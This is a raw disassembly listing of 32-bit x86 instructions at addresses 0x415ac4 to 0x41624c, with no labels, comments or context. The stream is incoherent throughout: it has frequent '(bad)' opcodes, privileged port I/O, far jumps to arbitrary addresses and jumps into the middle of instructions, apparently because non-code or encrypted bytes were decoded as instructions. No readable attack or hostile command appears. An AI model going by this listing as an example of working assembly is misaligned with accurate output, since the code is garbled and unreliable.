  415ac4:	add    BYTE PTR [esi+eiz*1-0x1bb7561],bh
  415acb:	dec    esi
  415acc:	cmc    
  415acd:	adc    cl,ch
  415acf:	stos   DWORD PTR es:[edi],eax
  415ad0:	addr16 mov dh,0x47
  415ad3:	add    al,0xb7
  415ad5:	push   es
  415ad6:	call   0x63ef:0x74751802
  415add:	inc    DWORD PTR [edx+0x3]
  415ae0:	adc    esi,edi
  415ae2:	jle    0x415a9e
  415ae4:	pop    es
  415ae5:	repnz pop esp
  415ae7:	inc    edx
  415ae8:	fdivr  DWORD PTR [ebp+0x5a60988f]
  415aee:	push   0xffffffa8
  415af0:	pop    edx
  415af1:	in     eax,0x72
  415af3:	es pusha 
  415af5:	add    ebp,esi
  415af7:	mov    ebx,0xedb10a35
  415afc:	shr    BYTE PTR [esi+0x288e612b],1
  415b02:	jne    0x415aaf
  415b04:	ss push ecx
  415b06:	pop    DWORD PTR [edx]
  415b08:	cmp    dl,BYTE PTR [eax+0x4156ee3b]
  415b0e:	mov    BYTE PTR [ebx+0x70],0x30
  415b12:	push   ecx
  415b13:	call   0xa588bcbc
  415b18:	dec    ebx
  415b19:	pop    ebx
  415b1a:	je     0x415ac6
  415b1c:	ror    DWORD PTR [ecx],cl
  415b1e:	inc    edx
  415b1f:	mov    edx,0x9088f565
  415b24:	jo     0x415b48
  415b26:	push   ds
  415b27:	aaa    
  415b28:	rol    BYTE PTR ds:0xcfdb143f,0x13
  415b2f:	icebp  
  415b30:	icebp  
  415b31:	scas   al,BYTE PTR es:[edi]
  415b32:	and    al,0x40
  415b34:	loope  0x415b00
  415b36:	repz imul esi,ecx,0xaab6db93
  415b3d:	jmp    0x415ad6
  415b3f:	jmp    0x415b18
  415b41:	inc    dh
  415b43:	lds    ebx,FWORD PTR [ebx+ebp*4]
  415b46:	test   al,0xe4
  415b48:	test   ebx,ecx
  415b4a:	cmp    al,0x9a
  415b4c:	sub    edx,ebx
  415b4e:	and    DWORD PTR [ecx-0x21],edx
  415b51:	pop    esp
  415b52:	push   esp
  415b53:	sub    DWORD PTR [esi-0x26ee8d33],edi
  415b59:	or     al,0x33
  415b5b:	outs   dx,DWORD PTR ds:[esi]
  415b5c:	sbb    ch,BYTE PTR [esi+0x46]
  415b5f:	(bad)  
  415b60:	out    0xf1,eax
  415b62:	cmp    BYTE PTR [edx+0x7d4fb2f8],bl
  415b68:	(bad)  
  415b69:	inc    edi
  415b6a:	adc    eax,0x354c7198
  415b6f:	in     eax,dx
  415b70:	pop    ss
  415b71:	push   esi
  415b72:	std    
  415b73:	xchg   edi,eax
  415b74:	mov    cl,0x16
  415b76:	mov    dh,0x48
  415b78:	ins    BYTE PTR es:[edi],dx
  415b79:	addr16 mov dh,0x52
  415b7c:	adc    al,0xda
  415b7e:	fmul   DWORD PTR [eax]
  415b80:	arpl   WORD PTR ds:0x74b5f017,dx
  415b86:	cmp    eax,0xe51589c0
  415b8b:	iret   
  415b8c:	in     eax,0x4e
  415b8e:	loopne 0x415b8e
  415b90:	pop    ecx
  415b91:	xchg   esi,eax
  415b92:	ret    0x3972
  415b95:	lahf   
  415b96:	pop    esi
  415b97:	xor    al,0x12
  415b99:	xchg   BYTE PTR [ebp+0x21902bc],al
  415b9f:	pop    ebx
  415ba0:	push   0xffffffc0
  415ba2:	aaa    
  415ba3:	or     edi,DWORD PTR [esi]
  415ba5:	pop    esp
  415ba6:	dec    esp
  415ba7:	jno    0x415bfa
  415ba9:	test   eax,0x25b2646
  415bae:	enter  0x75b5,0xeb
  415bb2:	retf   0x13ee
  415bb5:	scas   al,BYTE PTR es:[edi]
  415bb6:	test   DWORD PTR [edx-0x5e655b2e],edx
  415bbc:	inc    edx
  415bbd:	sub    BYTE PTR [ebp-0x14],dl
  415bc0:	aam    0xd
  415bc2:	adc    DWORD PTR [ebx-0x13],ebp
  415bc5:	cs pop ebp
  415bc7:	jl     0x415b68
  415bc9:	inc    esp
  415bca:	pop    eax
  415bcb:	test   eax,0x764196d5
  415bd0:	mov    ch,0xd8
  415bd2:	adc    al,0xcc
  415bd4:	loope  0x415ba8
  415bd6:	mov    bl,0x51
  415bd8:	loopne 0x415bb5
  415bda:	mov    al,0x44
  415bdc:	and    dl,BYTE PTR [edx-0x7025e92]
  415be2:	outs   dx,DWORD PTR ds:[esi]
  415be3:	and    BYTE PTR [esi+0x7fad5c12],cl
  415be9:	dec    eax
  415bea:	retf   0xb68a
  415bed:	push   esp
  415bee:	mov    eax,0x22c1f92a
  415bf3:	push   ss
  415bf4:	xchg   ebp,eax
  415bf5:	push   esi
  415bf6:	push   ebx
  415bf7:	lds    ebp,FWORD PTR [ebx]
  415bf9:	mov    cl,0xca
  415bfb:	xor    ebx,0x17
  415bfe:	sti    
  415bff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c00:	pop    ss
  415c01:	xlat   BYTE PTR ds:[ebx]
  415c02:	pushf  
  415c03:	mov    DWORD PTR [ebx-0x74],ebp
  415c06:	outs   dx,DWORD PTR ds:[esi]
  415c07:	add    dh,al
  415c09:	sub    bl,BYTE PTR [ecx-0x45721a37]
  415c0f:	addr16 sub eax,0xb4975a41
  415c15:	imul   ebp,ebx,0x3ee8b955
  415c1b:	ins    DWORD PTR es:[edi],dx
  415c1c:	imul   edi,DWORD PTR [ecx-0x72],0xdeddfdfe
  415c23:	xchg   edx,eax
  415c24:	and    ebx,edx
  415c26:	add    al,0xfe
  415c28:	das    
  415c29:	inc    edx
  415c2a:	xchg   edx,eax
  415c2b:	push   edx
  415c2c:	ins    BYTE PTR es:[edi],dx
  415c2d:	mov    ?,edi
  415c2f:	arpl   WORD PTR [ebp-0x43],bp
  415c32:	jno    0x415bc5
  415c34:	je     0x415bf3
  415c36:	ret    0xac56
  415c39:	jle    0x415c8d
  415c3b:	mov    gs,WORD PTR [ecx+ecx*4]
  415c3e:	ins    DWORD PTR es:[edi],dx
  415c3f:	scas   al,BYTE PTR es:[edi]
  415c40:	or     BYTE PTR [ebx+edx*1+0x4df2735b],0xfa
  415c48:	add    ah,BYTE PTR [eax+0x70a0d34c]
  415c4e:	sbb    cl,BYTE PTR [edx]
  415c50:	rol    edx,1
  415c52:	aaa    
  415c53:	push   0xffffffd3
  415c55:	rcr    BYTE PTR [esi],1
  415c57:	popf   
  415c58:	fxam   
  415c5a:	adc    BYTE PTR [ebp-0x7d],cl
  415c5d:	and    DWORD PTR [edi+eiz*8],edi
  415c60:	(bad)  
  415c61:	dec    eax
  415c62:	pop    esi
  415c63:	jge    0x415c54
  415c65:	pushf  
  415c66:	mov    BYTE PTR [ebp+0x2d503095],bh
  415c6c:	jne    0x415c39
  415c6e:	arpl   WORD PTR [edi-0x3c],di
  415c71:	and    bh,BYTE PTR [ebx-0x62]
  415c74:	jle    0x415cb2
  415c76:	inc    eax
  415c77:	dec    ecx
  415c78:	shr    DWORD PTR [eax+0x38],1
  415c7b:	ss pop ss
  415c7d:	mov    al,ah
  415c7f:	and    al,ah
  415c81:	pop    esp
  415c82:	popf   
  415c83:	pop    eax
  415c84:	fs push ebx
  415c86:	in     al,dx
  415c87:	xor    BYTE PTR [edx-0x3eafad18],al
  415c8d:	lods   eax,DWORD PTR ds:[esi]
  415c8e:	pop    ds
  415c8f:	push   cs
  415c90:	outs   dx,DWORD PTR ds:[esi]
  415c91:	xor    DWORD PTR [edi+esi*1],edx
  415c94:	inc    ecx
  415c95:	pop    esp
  415c96:	pop    ebp
  415c97:	xor    edi,ecx
  415c99:	mov    esi,0xc7c3d70
  415c9e:	cmp    edx,DWORD PTR [ecx]
  415ca0:	dec    esi
  415ca1:	mov    dl,0xa2
  415ca3:	loope  0x415c60
  415ca5:	xchg   edi,eax
  415ca6:	in     eax,0xa2
  415ca8:	or     DWORD PTR [ebx],eax
  415caa:	pop    ebx
  415cab:	add    edx,edi
  415cad:	mov    bl,0x8b
  415caf:	les    esp,FWORD PTR [esi]
  415cb1:	imul   ecx,DWORD PTR [esi],0x484ce15d
  415cb7:	loopne 0x415d31
  415cb9:	mov    ecx,0xe4849b61
  415cbe:	inc    ebx
  415cbf:	jbe    0x415c86
  415cc1:	std    
  415cc2:	int    0xde
  415cc4:	rcl    DWORD PTR [eax],0xbf
  415cc7:	es scas eax,DWORD PTR es:[edi]
  415cc9:	sbb    al,0x5c
  415ccb:	loop   0x415d44
  415ccd:	lods   eax,DWORD PTR ds:[esi]
  415cce:	adc    DWORD PTR [edi],0x47
  415cd1:	stc    
  415cd2:	cmp    BYTE PTR [esi],dh
  415cd4:	sar    DWORD PTR [ebp+0x769f6175],1
  415cda:	mov    ss,WORD PTR [ebp-0x6ed34b38]
  415ce0:	call   DWORD PTR [esi-0x44]
  415ce3:	test   DWORD PTR [ebx-0x42],edi
  415ce6:	ins    DWORD PTR es:[edi],dx
  415ce7:	pop    ecx
  415ce8:	rcl    BYTE PTR [ebp+0xd],1
  415ceb:	dec    edi
  415cec:	aam    0xb
  415cee:	jno    0x415d41
  415cf0:	pop    esi
  415cf1:	push   cs
  415cf2:	xchg   edx,eax
  415cf3:	out    dx,al
  415cf4:	xor    edx,ebx
  415cf6:	and    dh,bh
  415cf8:	outs   dx,BYTE PTR ds:[esi]
  415cf9:	enter  0xe34d,0x8c
  415cfd:	add    ecx,DWORD PTR [ebx+ebp*2-0x34]
  415d01:	pop    ds
  415d02:	pop    ecx
  415d03:	push   es
  415d04:	out    0xb4,eax
  415d06:	jmp    0x1b5d:0xdc58f240
  415d0d:	call   0xebf138d9
  415d12:	int    0x24
  415d14:	mov    dh,0x5f
  415d16:	aad    0x1
  415d18:	mov    eax,ds:0x6428cb0a
  415d1d:	adc    edx,esp
  415d1f:	popf   
  415d20:	ja     0x415d35
  415d22:	outs   dx,DWORD PTR ds:[esi]
  415d23:	add    eax,ebx
  415d25:	imul   esp,DWORD PTR [ecx],0x5c
  415d28:	pop    edi
  415d29:	mov    ebp,0xb58de7c2
  415d2e:	iret   
  415d2f:	outs   dx,DWORD PTR ds:[esi]
  415d30:	pop    ebx
  415d31:	dec    ebx
  415d32:	loop   0x415cb7
  415d34:	inc    ecx
  415d35:	pop    ss
  415d36:	ret    
  415d37:	mov    esi,0xef8ea829
  415d3c:	and    eax,0x6ca623d7
  415d41:	cwde   
  415d42:	out    dx,eax
  415d43:	xlat   BYTE PTR ds:[ebx]
  415d45:	lea    esi,[edx-0x1c4a0cf7]
  415d4b:	stos   DWORD PTR es:[edi],eax
  415d4c:	xchg   esi,eax
  415d4d:	xor    bh,BYTE PTR [esi]
  415d4f:	(bad)  
  415d50:	cld    
  415d51:	test   eax,0xf3ed89dd
  415d56:	pop    es
  415d57:	pop    ecx
  415d58:	mov    DWORD PTR [ebx+0x2610ecf3],edx
  415d5e:	push   ebx
  415d5f:	push   ds
  415d60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d62:	pushf  
  415d63:	inc    ebx
  415d64:	cmp    DWORD PTR [eax-0x5e30d760],0xa64f29f8
  415d6e:	jmp    0x52ed:0x54e1c17f
  415d75:	cmp    eax,0x5d687d53
  415d7a:	pop    edi
  415d7b:	jbe    0x415d39
  415d7d:	mov    ds:0xd675c287,al
  415d82:	cmp    DWORD PTR [ebp-0x36],esp
  415d85:	jecxz  0x415d17
  415d87:	pop    ebx
  415d89:	hlt    
  415d8a:	retf   0x3edd
  415d8d:	push   esi
  415d8e:	mov    es,edx
  415d90:	cwde   
  415d91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d93:	rol    ah,1
  415d95:	or     DWORD PTR ds:0x4e352fb8,ebp
  415d9b:	xlat   BYTE PTR ds:[ebx]
  415d9c:	mov    dl,0xc
  415d9e:	sbb    dh,al
  415da0:	xchg   edx,eax
  415da1:	iret   
  415da2:	xor    DWORD PTR [edx],0xffffffa7
  415da5:	fadd   DWORD PTR [edx-0x16]
  415da8:	retf   0x817a
  415dab:	pop    esp
  415dac:	xor    eax,0x3fe1d474
  415db1:	scas   al,BYTE PTR es:[edi]
  415db2:	lods   al,BYTE PTR ds:[esi]
  415db3:	fs push edi
  415db5:	icebp  
  415db6:	jo     0x415e21
  415db8:	pushf  
  415db9:	sub    eax,0x2fd93138
  415dbe:	dec    esi
  415dbf:	jecxz  0x415dea
  415dc1:	cmp    DWORD PTR [edx],edx
  415dc3:	out    0xda,al
  415dc5:	hlt    
  415dc6:	data16 jl 0x415e35
  415dc9:	mov    cl,0x48
  415dcb:	(bad)  
  415dcc:	sub    cl,BYTE PTR [eax]
  415dce:	dec    DWORD PTR [edx+0x761ea115]
  415dd4:	cld    
  415dd5:	ficom  DWORD PTR cs:[ebx]
  415dd8:	or     BYTE PTR [ebx-0x32],bh
  415ddb:	push   0xb6cb512b
  415de0:	je     0x415dcd
  415de2:	stos   BYTE PTR es:[edi],al
  415de3:	loop   0x415da0
  415de5:	cmp    bh,al
  415de7:	sub    eax,0x83444c35
  415dec:	lods   eax,DWORD PTR ds:[esi]
  415ded:	sti    
  415dee:	push   cs
  415def:	mov    bh,0xed
  415df1:	inc    esi
  415df2:	call   0xee16ecf5
  415df7:	in     eax,dx
  415df8:	inc    eax
  415df9:	arpl   WORD PTR [ecx-0x4349918f],si
  415dff:	mov    edi,0xdcc8a8a2
  415e04:	add    bh,BYTE PTR [ecx-0x1bb76d05]
  415e0a:	dec    esi
  415e0b:	mov    al,ds:0x86599fe0
  415e10:	xchg   esp,eax
  415e11:	jae    0x415dee
  415e13:	lahf   
  415e14:	xlat   BYTE PTR ds:[ebx]
  415e15:	or     ebx,DWORD PTR [eax]
  415e17:	and    DWORD PTR [esi],edx
  415e19:	jmp    FWORD PTR [ebx+0x48]
  415e1c:	mov    dl,0x9b
  415e1e:	adc    dh,BYTE PTR [edx+0x4faf2164]
  415e24:	es (bad) 
  415e26:	dec    ebp
  415e27:	push   0x32ce0148
  415e2c:	dec    edx
  415e2d:	fimul  DWORD PTR [ebx]
  415e2f:	or     DWORD PTR [esi+ebp*1+0x63],edx
  415e33:	cmp    bh,BYTE PTR [ecx*8-0x12886601]
  415e3a:	jle    0x415ddf
  415e3c:	clc    
  415e3d:	lahf   
  415e3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e3f:	adc    eax,0xff9dbd50
  415e44:	ja     0x415eb2
  415e46:	jmp    0xf0f0a3ea
  415e4b:	sub    BYTE PTR [eax],cl
  415e4d:	dec    bp
  415e4f:	xchg   DWORD PTR [esi+0x68d09e2c],esi
  415e55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e56:	push   edx
  415e57:	or     dl,0xd8
  415e5a:	ss and eax,0x783835a9
  415e60:	bound  esi,QWORD PTR [ebx-0x66150c86]
  415e66:	aam    0x92
  415e68:	hlt    
  415e69:	enter  0x5147,0x1d
  415e6d:	adc    BYTE PTR [eax+eax*8],al
  415e70:	adc    eax,0x3f3a5c22
  415e75:	fwait
  415e76:	sub    al,0x16
  415e78:	mov    eax,0x945ef481
  415e7d:	fisub  DWORD PTR [edi]
  415e7f:	mov    gs,ebp
  415e81:	rcl    DWORD PTR [eax+0x5a02ee59],0x78
  415e88:	(bad)  
  415e89:	(bad)  
  415e8a:	pop    ss
  415e8b:	push   esp
  415e8c:	mov    ss:0xc31860ef,al
  415e92:	popf   
  415e93:	scas   al,BYTE PTR es:[edi]
  415e94:	and    al,0xbf
  415e96:	out    dx,eax
  415e97:	fist   WORD PTR ds:0x7eda6e8
  415e9d:	jns    0x415e7f
  415e9f:	out    dx,eax
  415ea0:	iret   
  415ea1:	stos   BYTE PTR es:[edi],al
  415ea2:	add    DWORD PTR [edi],edi
  415ea4:	aam    0x5d
  415ea6:	in     eax,0xf6
  415ea8:	xchg   edx,eax
  415ea9:	push   ecx
  415eaa:	adc    cl,BYTE PTR [edi]
  415eac:	popf   
  415ead:	stos   DWORD PTR es:[edi],eax
  415eae:	loop   0x415f13
  415eb0:	xor    edi,DWORD PTR [edx+eax*4]
  415eb3:	inc    eax
  415eb4:	(bad)  
  415eb5:	out    0x20,al
  415eb7:	sub    ah,0x28
  415eba:	imul   esi,edx,0x524ed0db
  415ec0:	inc    eax
  415ec1:	jmp    0x35c0:0xf4162f5f
  415ec8:	sbb    eax,0xd5448739
  415ecd:	mov    DWORD PTR [ecx-0x5141ccbe],esp
  415ed3:	retf   
  415ed4:	push   edi
  415ed5:	scas   eax,DWORD PTR es:[edi]
  415ed6:	jl     0x415ed5
  415ed8:	push   edx
  415ed9:	leave  
  415eda:	sbb    al,0x30
  415edc:	and    edx,DWORD PTR [edi]
  415ede:	test   BYTE PTR [esi+0x7a],dh
  415ee1:	int    0xff
  415ee3:	mov    ch,BYTE PTR [edx]
  415ee5:	push   ebp
  415ee6:	adc    edi,edi
  415ee8:	inc    edx
  415ee9:	retf   0xa780
  415eec:	xchg   ebp,eax
  415eed:	mov    bl,0x28
  415eef:	fnsave [edx+ebx*2]
  415ef2:	retf   0x6a7c
  415ef5:	out    0x74,al
  415ef7:	hlt    
  415ef8:	into   
  415ef9:	and    ebx,DWORD PTR [edi+0x77]
  415efc:	(bad)  
  415efd:	mov    ah,0xa8
  415eff:	pusha  
  415f00:	push   ebp
  415f01:	test   al,0x8b
  415f03:	inc    esp
  415f04:	out    0x93,eax
  415f06:	frstor [edi-0x31]
  415f09:	cdq    
  415f0a:	mov    cl,0x95
  415f0c:	sbb    ah,BYTE PTR [ebp+esi*8+0x4db65983]
  415f13:	dec    esp
  415f14:	mov    dl,0x30
  415f16:	fwait
  415f17:	(bad)  
  415f18:	or     al,0x48
  415f1a:	dec    ebp
  415f1b:	mov    ebx,0xeb9f90a1
  415f20:	nop
  415f21:	and    DWORD PTR [esi+0x68],edx
  415f24:	sub    al,0x14
  415f26:	fld    TBYTE PTR [edx+0x11295b81]
  415f2c:	cmp    DWORD PTR [esp+edx*1],esi
  415f2f:	lods   eax,DWORD PTR ds:[esi]
  415f30:	bound  eax,QWORD PTR [ebp+0x6fde8b43]
  415f36:	jb     0x415f65
  415f38:	out    0xa2,eax
  415f3a:	out    0x12,eax
  415f3c:	outs   dx,BYTE PTR ds:[esi]
  415f3d:	stos   DWORD PTR es:[edi],eax
  415f3e:	je     0x415f3b
  415f40:	push   cs
  415f41:	mul    DWORD PTR [edx+0x50]
  415f44:	stos   DWORD PTR es:[edi],eax
  415f45:	les    eax,FWORD PTR [ecx+edi*8-0x1c3dbad5]
  415f4c:	sub    BYTE PTR [eax-0x3e507610],cl
  415f52:	inc    ebx
  415f53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f54:	sbb    al,0xcd
  415f56:	xchg   BYTE PTR [ebp+0x20],ah
  415f59:	add    DWORD PTR [ecx],ebx
  415f5b:	imul   esi,ebp,0x7c4e26e0
  415f61:	clc    
  415f62:	(bad)  
  415f63:	test   edi,0x963afe9e
  415f69:	jbe    0x415fb8
  415f6b:	mov    bl,0xa7
  415f6d:	aas    
  415f6e:	test   BYTE PTR [esi],0x9b
  415f71:	add    ah,dh
  415f73:	inc    edx
  415f74:	sbb    dh,BYTE PTR [ebp+0x28faee7b]
  415f7a:	cmc    
  415f7b:	dec    edx
  415f7c:	xchg   edi,eax
  415f7d:	push   cs
  415f7e:	(bad)  
  415f7f:	retf   0xff48
  415f82:	or     DWORD PTR [ebp-0xc1c3915],0xffffffda
  415f89:	stos   BYTE PTR es:[edi],al
  415f8a:	sbb    BYTE PTR [edx+eax*2-0x18],0xdf
  415f8f:	mov    edx,0xe363c7e2
  415f94:	dec    ebp
  415f95:	leave  
  415f96:	xchg   esi,eax
  415f97:	imul   ecx,ecx,0x6b
  415f9a:	pushf  
  415f9b:	js     0x415f3c
  415f9d:	dec    edx
  415f9e:	cld    
  415f9f:	jecxz  0x415f43
  415fa1:	arpl   ax,sp
  415fa3:	adc    eax,0xcfd93a56
  415fa8:	mov    al,ds:0xa2bcf026
  415fad:	mov    ecx,DWORD PTR [esi+ebp*1-0x29]
  415fb1:	push   edx
  415fb2:	mov    edi,esp
  415fb4:	popf   
  415fb5:	jge    0x415f8f
  415fb7:	lahf   
  415fb8:	mov    ah,0x68
  415fba:	and    eax,ebx
  415fbc:	push   ds
  415fbd:	pop    eax
  415fbe:	pop    ebx
  415fbf:	fiadd  WORD PTR [ebp-0x45]
  415fc2:	imul   DWORD PTR [eax*1+0x7f50352e]
  415fc9:	stos   BYTE PTR es:[edi],al
  415fca:	out    dx,al
  415fcb:	aas    
  415fcc:	sbb    ebx,edx
  415fce:	adc    edx,DWORD PTR [edx+0x3d5ba116]
  415fd4:	cld    
  415fd5:	je     0x415ff1
  415fd7:	and    al,BYTE PTR [esi+0x4d]
  415fda:	or     ah,bl
  415fdc:	mov    DWORD PTR [ebx+0x299abf42],ecx
  415fe2:	pop    esp
  415fe3:	mov    dh,0x56
  415fe5:	jmp    0x415fe6
  415fe7:	jl     0x415f78
  415fe9:	dec    edx
  415fea:	and    BYTE PTR [eax+0x30789967],ch
  415ff0:	cld    
  415ff1:	out    dx,al
  415ff2:	sbb    ebp,DWORD PTR [esi-0x4b]
  415ff5:	jbe    0x415ff3
  415ff7:	ss push 0xa8ce484d
  415ffd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ffe:	(bad)  
  415fff:	out    dx,al
  416000:	sti    
  416001:	add    eax,0xd9c065b3
  416006:	call   0xe995b3e8
  41600b:	(bad)
  41600e:	push   cs
  41600f:	mov    WORD PTR [eax-0x421c04d2],ss
  416015:	mov    WORD PTR [esi],cs
  416017:	outs   dx,DWORD PTR ds:[esi]
  416018:	jnp    0x415fd4
  41601a:	jno    0x415fa8
  41601c:	mov    al,ds:0x523004dc
  416021:	jae    0x416095
  416023:	mov    esp,0x26569465
  416028:	cmp    al,0x66
  41602a:	loopne 0x4160ab
  41602c:	cs xchg edx,eax
  41602e:	dec    ebp
  41602f:	and    eax,0xb5dcae55
  416034:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416035:	stos   BYTE PTR es:[edi],al
  416036:	mov    ah,0x32
  416038:	inc    ebx
  416039:	imul   ebx,DWORD PTR [ebx+0x27b1daea],0xc
  416040:	sbb    esp,edi
  416042:	retf   
  416043:	sahf   
  416044:	push   eax
  416045:	loopne 0x41606e
  416047:	and    dh,BYTE PTR ds:0x582c0b9a
  41604d:	popf   
  41604e:	les    ebx,FWORD PTR [ebx+ebp*8+0x78]
  416052:	adc    DWORD PTR [esi+0x5b],ebp
  416055:	xor    BYTE PTR [ecx+0x67189df0],bh
  41605b:	imul   DWORD PTR [ebx]
  41605d:	xchg   edx,eax
  41605e:	in     al,0x30
  416060:	or     ah,BYTE PTR [ebp+0x20]
  416063:	shl    BYTE PTR [ebp+0x66],0xd6
  416067:	jmp    DWORD PTR [esi]
  416069:	das    
  41606a:	ret    0x21ba
  41606d:	loopne 0x416020
  41606f:	mov    DWORD PTR [esi+0x7406ec15],0xa18cc3e1
  416079:	pop    es
  41607a:	shr    BYTE PTR [ebp-0x4e],cl
  41607d:	aas    
  41607e:	and    al,0x75
  416080:	adc    al,0x14
  416083:	xor    eax,0x29c81c8
  416088:	adc    cl,0x2d
  41608b:	test   eax,0x6cbc7afd
  416090:	inc    edx
  416091:	and    eax,0xbe771334
  416096:	leave  
  416097:	into   
  416098:	sbb    al,0x59
  41609a:	mov    dh,0x17
  41609c:	mov    ecx,0x88b182b7
  4160a1:	xor    al,0x16
  4160a3:	ror    ecx,0xa9
  4160a6:	xchg   ebp,eax
  4160a7:	arpl   WORD PTR [edi+eax*8],si
  4160aa:	mov    al,0xf5
  4160ac:	neg    DWORD PTR [ecx-0x70a5da0c]
  4160b2:	sar    BYTE PTR [ebx+eax*4-0x57abdff5],0xc6
  4160ba:	(bad)  
  4160bb:	mov    ebx,0x486d899f
  4160c0:	je     0x4160b2
  4160c2:	push   es
  4160c3:	repz xchg edx,eax
  4160c5:	jmp    0x18dd9b38
  4160ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160cb:	adc    edx,DWORD PTR [ebx+0x34bd1a3b]
  4160d1:	jg     0x4160ff
  4160d3:	push   0xffffff8e
  4160d5:	pop    ds
  4160d6:	imul   ebx,edx,0x23
  4160d9:	xchg   ebp,eax
  4160da:	div    esp
  4160dc:	inc    esi
  4160dd:	stos   DWORD PTR es:[edi],eax
  4160de:	mov    bl,0x5f
  4160e0:	pop    edx
  4160e1:	adc    dh,bl
  4160e3:	inc    esi
  4160e4:	mov    eax,0xfba745c4
  4160e9:	ins    DWORD PTR es:[edi],dx
  4160ea:	fisub  DWORD PTR [ecx+ebp*8+0x32]
  4160ee:	xchg   BYTE PTR [ebp+0x77],al
  4160f1:	iret   
  4160f2:	ret    0x13c9
  4160f5:	inc    ebp
  4160f6:	push   0x699a0b6d
  4160fb:	sbb    cl,BYTE PTR [esi]
  4160fd:	xchg   BYTE PTR [ebx-0x6a0c3eea],bh
  416103:	jmp    0x41614e
  416105:	sbb    cl,BYTE PTR [ebp+0x55]
  416108:	sti    
  416109:	jns    0x4160f5
  41610b:	shl    eax,1
  41610d:	or     BYTE PTR [esi+ebx*2+0x7b],dh
  416111:	cli    
  416112:	pop    esp
  416113:	in     al,dx
  416114:	(bad)  
  416115:	pusha  
  416116:	call   0x8e5b223a
  41611b:	call   0x7ef82fb5
  416120:	or     eax,0x5fea8c9
  416125:	add    DWORD PTR [ecx],edx
  416127:	fcom   QWORD PTR [ebx]
  416129:	sbb    bh,BYTE PTR [ecx+ebx*2-0x77]
  41612d:	scas   al,BYTE PTR es:[edi]
  41612e:	push   es
  41612f:	fwait
  416130:	cli    
  416131:	leave  
  416132:	gs mov al,0x96
  416135:	sbb    ebx,DWORD PTR [edx-0x5ea923e6]
  41613b:	xor    esp,DWORD PTR [eax-0x9eafb12]
  416141:	mov    eax,0x5a864ca7
  416146:	push   esp
  416147:	das    
  416148:	push   cs
  416149:	jnp    0x416160
  41614b:	mov    dh,0xeb
  41614d:	adc    al,BYTE PTR [edx+ecx*1]
  416150:	cdq    
  416151:	js     0x41616b
  416153:	shl    DWORD PTR [esi],1
  416155:	dec    ecx
  416156:	int3   
  416157:	shl    BYTE PTR [esi-0x4d],1
  41615a:	nop
  41615b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41615c:	in     eax,dx
  41615d:	stos   DWORD PTR es:[edi],eax
  41615e:	xchg   BYTE PTR [edx+0x78],ah
  416161:	sub    eax,0x2edc4f79
  416166:	xchg   DWORD PTR [ebx-0x54],edi
  416169:	daa    
  41616a:	sbb    bl,al
  41616c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41616d:	sbb    ch,BYTE PTR [edx-0x4c]
  416170:	not    BYTE PTR [ecx-0x6]
  416173:	pushf  
  416174:	mov    fs,WORD PTR [ebx]
  416176:	shl    BYTE PTR [ebx+0x3b],1
  416179:	mov    ah,0xfe
  41617b:	xchg   DWORD PTR [ecx+0x7cc90982],edx
  416181:	adc    eax,DWORD PTR [esi+0x333890f7]
  416187:	mov    esi,0xa9c028a9
  41618c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41618d:	ds test eax,0x1b139a0c
  416193:	lods   eax,DWORD PTR fs:[esi]
  416195:	push   ebx
  416196:	and    BYTE PTR [ecx-0x4e],bh
  416199:	sub    eax,0xc12cc6d9
  41619e:	sbb    al,0x86
  4161a0:	pop    ds
  4161a1:	mov    dh,0x85
  4161a3:	call   0x276fbd93
  4161a8:	fimul  DWORD PTR [edx+edi*1+0x7ec03595]
  4161af:	test   eax,0x9eb45d95
  4161b4:	ja     0x4161d1
  4161b6:	(bad)  
  4161b7:	(bad)  
  4161b8:	(bad)  
  4161b9:	int    0xf
  4161bb:	or     bl,BYTE PTR [eax+0x32769f8]
  4161c1:	addr16 mov esp,0x645755be
  4161c7:	pusha  
  4161c8:	adc    dh,BYTE PTR [ecx]
  4161ca:	dec    edi
  4161cb:	mov    ebp,0x2643e786
  4161d0:	mov    ebx,0xcea087cb
  4161d5:	push   0x633df22b
  4161da:	mov    BYTE PTR [ebp+0x26b640eb],dh
  4161e0:	cmc    
  4161e1:	sub    edx,DWORD PTR [ebp+ecx*2-0xb]
  4161e5:	cmp    DWORD PTR ds:0x243cd02,ebx
  4161eb:	pop    ss
  4161ec:	sbb    dl,BYTE PTR [edi+0x13350599]
  4161f2:	xchg   esp,eax
  4161f3:	mov    dl,0x9e
  4161f5:	es push ebx
  4161f7:	cdq    
  4161f8:	mov    dl,0x9f
  4161fa:	popa   
  4161fb:	cdq    
  4161fc:	pop    edi
  4161fd:	cmp    al,0x95
  4161ff:	and    BYTE PTR [eax-0x4869acdb],cl
  416205:	scas   al,BYTE PTR es:[edi]
  416206:	jb     0x416218
  416208:	sub    cl,BYTE PTR ds:0x6350c2e6
  41620e:	out    dx,al
  41620f:	test   BYTE PTR [eax],dh
  416211:	mov    BYTE PTR [ebp-0x329829ca],bh
  416217:	and    BYTE PTR ds:0x17355b84,al
  41621d:	into   
  41621e:	stos   DWORD PTR es:[edi],eax
  41621f:	mov    eax,0x501db6d2
  416224:	cwde   
  416225:	and    ch,BYTE PTR [edi+0x2fa29640]
  41622b:	dec    eax
  41622c:	pop    eax
  41622d:	inc    ecx
  41622e:	adc    bh,BYTE PTR [ebx]
  416230:	cmp    BYTE PTR [edx+0x19ee62f6],bh
  416236:	inc    esi
  416237:	mov    ds:0x96a88611,al
  41623c:	adc    BYTE PTR [ebp+0x637d5e9],0xd0
  416243:	xchg   edx,eax
  416244:	cwde   
  416245:	call   0x56cb3de5
  41624a:	pusha  
  41624b:	inc    esp
  41624c:	pop    ebp
